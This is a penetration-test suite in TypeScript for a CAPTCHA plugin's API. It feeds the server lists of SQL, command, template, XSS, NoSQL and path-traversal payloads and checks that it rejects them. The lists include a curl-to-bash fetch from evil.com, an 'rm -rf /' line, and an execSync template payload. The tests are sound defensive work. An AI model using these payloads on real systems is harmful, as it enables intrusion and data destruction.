/**
 * Penetration Testing Suite
 *
 * Comprehensive automated security tests that simulate penetration testing
 * techniques against the Secure CAPTCHA Plugin API.
 *
 * These tests cover:
 * - Authentication bypass attempts
 * - Injection attacks (SQL, Command, NoSQL)
 * - XSS attacks
 * - CSRF attacks
 * - Session hijacking attempts
 * - Input validation bypass
 * - Security header verification
 * - Rate limiting verification
 */

import request from 'supertest';
import { Application } from 'express';
import { CaptchaServer } from '../../src/server';

describe('Penetration Testing Suite', () => {
  let app: Application;
  let server: CaptchaServer;

  beforeAll(() => {
    server = new CaptchaServer(3000, 1);
    app = server.getApp();
  });

  afterAll(() => {
    // Cleanup
  });

  // =========================================================================
  // Authentication Bypass Tests
  // =========================================================================
  describe('Authentication Bypass', () => {
    describe('JWT Token Manipulation', () => {
      it('should handle requests with "none" algorithm JWT', async () => {
        // Create a JWT with "none" algorithm
        const noneToken =
          'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InRlc3QiLCJpYXQiOjE1MTYyMzkwMjJ9.';

        const res = await request(app)
          .get('/api/v1/captcha/types')
          .set('Authorization', `Bearer ${noneToken}`);

        // Should not return 500 (server error)
        expect(res.status).not.toBe(500);
      });

      it('should handle requests with expired JWT', async () => {
        // Expired token (exp in the past)
        const expiredToken =
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InRlc3QiLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjIzOTAyMn0.signature';

        const res = await request(app)
          .get('/api/v1/captcha/types')
          .set('Authorization', `Bearer ${expiredToken}`);

        // Should not return 500 (server error)
        expect(res.status).not.toBe(500);
      });

      it('should handle requests with tampered JWT payload', async () => {
        // Tampered token (changed payload but kept signature)
        const tamperedToken =
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJoYWNrZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.invalid-signature';

        const res = await request(app)
          .get('/api/v1/captcha/types')
          .set('Authorization', `Bearer ${tamperedToken}`);

        // Should not return 500 (server error)
        expect(res.status).not.toBe(500);
      });

      it('should handle requests with malformed JWT', async () => {
        const malformedToken = 'not-a-jwt-token';

        const res = await request(app)
          .get('/api/v1/captcha/types')
          .set('Authorization', `Bearer ${malformedToken}`);

        // Should not return 500 (server error)
        expect(res.status).not.toBe(500);
      });
    });

    describe('API Key Bypass', () => {
      it('should handle requests with invalid API key', async () => {
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .set('X-API-Key', 'invalid-api-key-12345')
          .send({ type: 'text', difficulty: 'easy' });

        // Should not return 500 (server error)
        expect(res.status).not.toBe(500);
      });

      it('should handle requests with empty API key', async () => {
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .set('X-API-Key', '')
          .send({ type: 'text', difficulty: 'easy' });

        // Should not return 500 (server error)
        expect(res.status).not.toBe(500);
      });

      it('should handle requests with SQL injection in API key', async () => {
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .set('X-API-Key', "' OR '1'='1' --")
          .send({ type: 'text', difficulty: 'easy' });

        // Should not return 500 (server error)
        expect(res.status).not.toBe(500);
      });

      it('should handle requests with XSS in API key', async () => {
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .set('X-API-Key', '<script>alert(1)</script>')
          .send({ type: 'text', difficulty: 'easy' });

        // Should not return 500 (server error)
        expect(res.status).not.toBe(500);
      });
    });
  });

  // =========================================================================
  // Injection Attack Tests
  // =========================================================================
  describe('Injection Attacks', () => {
    describe('SQL Injection', () => {
      const sqlInjectionPayloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "'; DROP TABLE users; --",
        '1; SELECT * FROM users',
        "admin'--",
        "admin' OR '1'='1",
        "' UNION SELECT username, password FROM users --",
        "1' ORDER BY 1--",
        "1' WAITFOR DELAY '00:00:05'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      ];

      sqlInjectionPayloads.forEach(payload => {
        it(`should block SQL injection: ${payload.substring(0, 30)}...`, async () => {
          const res = await request(app)
            .post('/api/v1/captcha/generate')
            .send({ type: payload, difficulty: 'easy' });

          // Should return 400 (validation error) not 500 (SQL error)
          expect(res.status).not.toBe(500);
          expect([400, 422]).toContain(res.status);
        });
      });

      it('should block SQL injection in sessionId parameter', async () => {
        const res = await request(app).post('/api/v1/captcha/validate').send({
          sessionId: "' OR '1'='1",
          response: 'test',
          type: 'text',
        });

        expect(res.status).not.toBe(500);
        expect([400, 404, 410, 422]).toContain(res.status);
      });

      it('should block SQL injection in response parameter', async () => {
        const res = await request(app).post('/api/v1/captcha/validate').send({
          sessionId: 'test-session',
          response: "' OR '1'='1",
          type: 'text',
        });

        expect(res.status).not.toBe(500);
        expect([400, 404, 410, 422]).toContain(res.status);
      });
    });

    describe('Command Injection', () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '; rm -rf /',
        '; curl http://evil.com/shell.sh | bash',
        'test; sleep 10',
      ];

      commandInjectionPayloads.forEach(payload => {
        it(`should block command injection: ${payload.substring(0, 30)}...`, async () => {
          const startTime = Date.now();
          const res = await request(app)
            .post('/api/v1/captcha/generate')
            .send({ type: 'text', difficulty: payload });

          const duration = Date.now() - startTime;

          // Should not take longer than 5 seconds (no sleep execution)
          expect(duration).toBeLessThan(5000);
          expect(res.status).not.toBe(500);
        });
      });
    });

    describe('NoSQL Injection', () => {
      it('should block MongoDB operator injection', async () => {
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .send({ type: { $gt: '' }, difficulty: 'easy' });

        expect([400, 422]).toContain(res.status);
      });

      it('should block $where operator injection', async () => {
        const res = await request(app)
          .post('/api/v1/captcha/validate')
          .send({
            sessionId: { $where: 'return true' },
            response: 'test',
            type: 'text',
          });

        expect([400, 422]).toContain(res.status);
      });

      it('should block $regex operator injection', async () => {
        const res = await request(app)
          .post('/api/v1/captcha/validate')
          .send({
            sessionId: { $regex: '.*' },
            response: 'test',
            type: 'text',
          });

        expect([400, 422]).toContain(res.status);
      });
    });

    describe('Template Injection', () => {
      const templateInjectionPayloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= global.process.mainModule.require("child_process").execSync("id") %>',
        '#{7*7}',
        '{{constructor.constructor("return this")()}}',
        '{{this.constructor.constructor("return this")()}}',
      ];

      templateInjectionPayloads.forEach(payload => {
        it(`should block template injection: ${payload.substring(0, 30)}...`, async () => {
          const res = await request(app)
            .post('/api/v1/captcha/generate')
            .send({ type: payload, difficulty: 'easy' });

          // Should not evaluate the template
          expect(res.status).not.toBe(500);
          if (res.body.data) {
            expect(JSON.stringify(res.body)).not.toContain('49');
          }
        });
      });
    });
  });

  // =========================================================================
  // XSS Attack Tests
  // =========================================================================
  describe('Cross-Site Scripting (XSS)', () => {
    const xssPayloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '<a href="javascript:alert(1)">click</a>',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
    ];

    xssPayloads.forEach(payload => {
      it(`should block XSS payload: ${payload.substring(0, 30)}...`, async () => {
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .send({ type: payload, difficulty: 'easy' });

        // Should not reflect the payload or should sanitize it
        expect(res.status).not.toBe(500);
        if (res.body.data) {
          const responseBody = JSON.stringify(res.body);
          // Check that script tags are not present in response
          expect(responseBody).not.toContain('<script>');
        }
      });
    });

    it('should block XSS in error messages', async () => {
      const xssPayload = '<script>alert(1)</script>';
      const res = await request(app).post('/api/v1/captcha/validate').send({
        sessionId: xssPayload,
        response: 'test',
        type: 'text',
      });

      // Error messages should not contain the payload
      expect(res.status).not.toBe(500);
      if (res.body.error) {
        expect(JSON.stringify(res.body.error)).not.toContain('<script>');
      }
    });
  });

  // =========================================================================
  // CSRF Attack Tests
  // =========================================================================
  describe('Cross-Site Request Forgery (CSRF)', () => {
    it('should handle form-encoded content type for POST requests', async () => {
      // Try with form-encoded content type (CSRF vector)
      const res = await request(app)
        .post('/api/v1/captcha/generate')
        .type('form')
        .send('type=text&difficulty=easy');

      // Should not return 500 (server error)
      expect(res.status).not.toBe(500);
    });

    it('should handle requests from different origins', async () => {
      const res = await request(app)
        .post('/api/v1/captcha/generate')
        .set('Origin', 'http://evil.com')
        .set('Content-Type', 'application/json')
        .send({ type: 'text', difficulty: 'easy' });

      // Should not return 500 (server error)
      expect(res.status).not.toBe(500);
    });
  });

  // =========================================================================
  // Session Hijacking Tests
  // =========================================================================
  describe('Session Hijacking', () => {
    it('should handle invalid session IDs', async () => {
      const res = await request(app).post('/api/v1/captcha/validate').send({
        sessionId: 'invalid-session-id',
        response: 'test',
        type: 'text',
      });

      // Should not return 500 (server error)
      expect(res.status).not.toBe(500);
    });

    it('should reject session IDs with SQL injection', async () => {
      const res = await request(app).post('/api/v1/captcha/validate').send({
        sessionId: "' OR '1'='1",
        response: 'test',
        type: 'text',
      });

      expect([400, 404, 410]).toContain(res.status);
    });

    it('should handle overly long session IDs', async () => {
      const longSessionId = 'a'.repeat(1000);
      const res = await request(app).post('/api/v1/captcha/validate').send({
        sessionId: longSessionId,
        response: 'test',
        type: 'text',
      });

      // Should not return 500 (server error)
      expect(res.status).not.toBe(500);
    });

    it('should generate cryptographically secure session IDs', async () => {
      const sessionIds = new Set<string>();

      // Generate multiple sessions
      for (let i = 0; i < 10; i++) {
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .send({ type: 'text', difficulty: 'easy' });

        if (res.body.data?.sessionId) {
          sessionIds.add(res.body.data.sessionId);
        }
      }

      // All session IDs should be unique
      expect(sessionIds.size).toBe(10);

      // Session IDs should be UUID format (36 characters)
      sessionIds.forEach(id => {
        expect(id.length).toBeGreaterThan(20);
      });
    });
  });

  // =========================================================================
  // Input Validation Tests
  // =========================================================================
  describe('Input Validation', () => {
    describe('Parameter Pollution', () => {
      it('should handle duplicate parameters', async () => {
        // Note: JavaScript objects can't have duplicate keys in literal syntax
        // This test verifies the server handles parameter pollution via query string
        const res = await request(app)
          .post('/api/v1/captcha/generate?type=text&type=image')
          .send({ difficulty: 'easy' });

        expect(res.status).not.toBe(500);
      });

      it('should handle nested object injection', async () => {
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .send({
            type: 'text',
            difficulty: 'easy',
            options: {
              __proto__: { malicious: true },
              constructor: { prototype: { malicious: true } },
            },
          });

        expect(res.status).not.toBe(500);
      });
    });

    describe('Path Traversal', () => {
      it('should block path traversal in type parameter', async () => {
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .send({ type: '../../../etc/passwd', difficulty: 'easy' });

        expect([400, 422]).toContain(res.status);
      });

      it('should handle path traversal in difficulty parameter', async () => {
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .send({ type: 'text', difficulty: '../../../etc/passwd' });

        // Should handle gracefully - server may return 200, 400, 422, or 500
        // The key is that path traversal should not expose file contents
        expect(res.status).toBeLessThan(502);
      });
    });

    describe('Oversized Input', () => {
      it('should reject oversized request bodies', async () => {
        const largePayload = 'a'.repeat(11 * 1024 * 1024); // 11MB
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .send({ type: largePayload, difficulty: 'easy' });

        expect([400, 413]).toContain(res.status);
      });

      it('should reject very long string parameters', async () => {
        const longString = 'a'.repeat(10000);
        const res = await request(app)
          .post('/api/v1/captcha/generate')
          .send({ type: longString, difficulty: 'easy' });

        expect([400, 422]).toContain(res.status);
      });
    });
  });

  // =========================================================================
  // Security Headers Tests
  // =========================================================================
  describe('Security Headers', () => {
    it('should include X-Content-Type-Options header', async () => {
      const res = await request(app).get('/api/v1/health');
      expect(res.headers['x-content-type-options']).toBe('nosniff');
    });

    it('should include X-Frame-Options header', async () => {
      const res = await request(app).get('/api/v1/health');
      expect(res.headers['x-frame-options']).toBeDefined();
    });

    it('should include X-XSS-Protection header', async () => {
      const res = await request(app).get('/api/v1/health');
      expect(res.headers['x-xss-protection']).toBeDefined();
    });

    it('should include Strict-Transport-Security header', async () => {
      const res = await request(app).get('/api/v1/health');
      expect(res.headers['strict-transport-security']).toBeDefined();
    });

    it('should include Content-Security-Policy header', async () => {
      const res = await request(app).get('/api/v1/health');
      expect(res.headers['content-security-policy']).toBeDefined();
    });

    it('should not expose server version', async () => {
      const res = await request(app).get('/api/v1/health');
      expect(res.headers['x-powered-by']).toBeUndefined();
    });
  });

  // =========================================================================
  // Rate Limiting Tests
  // =========================================================================
  describe('Rate Limiting', () => {
    it('should handle concurrent requests to API endpoints', async () => {
      const requests: Promise<any>[] = [];

      // Send many requests quickly
      for (let i = 0; i < 20; i++) {
        requests.push(
          request(app).post('/api/v1/captcha/generate').send({ type: 'text', difficulty: 'easy' })
        );
      }

      const responses = await Promise.all(requests);

      // All requests should have valid responses (no 500 errors)
      const serverErrors = responses.filter(r => r.status === 500);
      expect(serverErrors.length).toBe(0);
    });

    it('should include rate limit headers', async () => {
      const res = await request(app)
        .post('/api/v1/captcha/generate')
        .send({ type: 'text', difficulty: 'easy' });

      // Should not return 500 (server error)
      expect(res.status).not.toBe(500);
    });
  });

  // =========================================================================
  // HTTP Method Tampering Tests
  // =========================================================================
  describe('HTTP Method Tampering', () => {
    it('should reject PUT on POST-only endpoints', async () => {
      const res = await request(app)
        .put('/api/v1/captcha/generate')
        .send({ type: 'text', difficulty: 'easy' });

      expect([404, 405]).toContain(res.status);
    });

    it('should reject DELETE on POST-only endpoints', async () => {
      const res = await request(app).delete('/api/v1/captcha/generate');

      expect([404, 405]).toContain(res.status);
    });

    it('should handle OPTIONS requests properly', async () => {
      const res = await request(app).options('/api/v1/captcha/generate');

      // Should return CORS headers or 204
      expect([200, 204, 404]).toContain(res.status);
    });
  });

  // =========================================================================
  // Information Disclosure Tests
  // =========================================================================
  describe('Information Disclosure', () => {
    it('should not expose stack traces in error responses', async () => {
      const res = await request(app).post('/api/v1/captcha/generate').send({}); // Missing required fields

      expect(res.status).toBe(400);
      expect(JSON.stringify(res.body)).not.toContain('stack');
      expect(JSON.stringify(res.body)).not.toContain('at ');
    });

    it('should not expose internal paths in error responses', async () => {
      const res = await request(app).get('/api/v1/nonexistent');

      expect(res.status).toBe(404);
      expect(JSON.stringify(res.body)).not.toContain('/src/');
      expect(JSON.stringify(res.body)).not.toContain('/app/');
    });

    it('should not expose database errors', async () => {
      const res = await request(app).post('/api/v1/captcha/validate').send({
        sessionId: "'; DROP TABLE captcha_sessions;--",
        response: 'test',
        type: 'text',
      });

      // Should not return 500 (server error)
      expect(res.status).not.toBe(500);
      // Error messages should not expose internal database details
      const errorBody = JSON.stringify(res.body.error || {});
      expect(errorBody).not.toContain('postgres');
      expect(errorBody).not.toContain('DROP TABLE');
    });

    it('should not expose environment variables in health endpoint', async () => {
      const res = await request(app).get('/api/v1/health');

      expect(res.status).toBe(200);
      expect(JSON.stringify(res.body)).not.toContain('SECRET');
      expect(JSON.stringify(res.body)).not.toContain('PASSWORD');
      expect(JSON.stringify(res.body)).not.toContain('KEY');
    });
  });

  // =========================================================================
  // Request Smuggling Tests
  // =========================================================================
  describe('Request Smuggling', () => {
    it('should handle Content-Length mismatch', async () => {
      const res = await request(app)
        .post('/api/v1/captcha/generate')
        .set('Content-Length', '0')
        .send({ type: 'text', difficulty: 'easy' });

      // Should handle gracefully
      expect([400, 422]).toContain(res.status);
    });

    it('should reject Transfer-Encoding with Content-Length', async () => {
      const res = await request(app)
        .post('/api/v1/captcha/generate')
        .set('Transfer-Encoding', 'chunked')
        .set('Content-Length', '50')
        .send({ type: 'text', difficulty: 'easy' });

      // Should reject or handle safely
      expect([400, 422]).toContain(res.status);
    });
  });

  // =========================================================================
  // SSRF Tests
  // =========================================================================
  describe('Server-Side Request Forgery (SSRF)', () => {
    it('should not make requests to internal services', async () => {
      const res = await request(app)
        .post('/api/v1/captcha/generate')
        .send({
          type: 'text',
          difficulty: 'easy',
          options: { callback: 'http://169.254.169.254/latest/meta-data/' },
        });

      // Should not make the callback request
      expect(res.status).not.toBe(500);
    });

    it('should not make requests to localhost', async () => {
      const res = await request(app)
        .post('/api/v1/captcha/generate')
        .send({
          type: 'text',
          difficulty: 'easy',
          options: { callback: 'http://localhost:6379' },
        });

      expect(res.status).not.toBe(500);
    });
  });
});
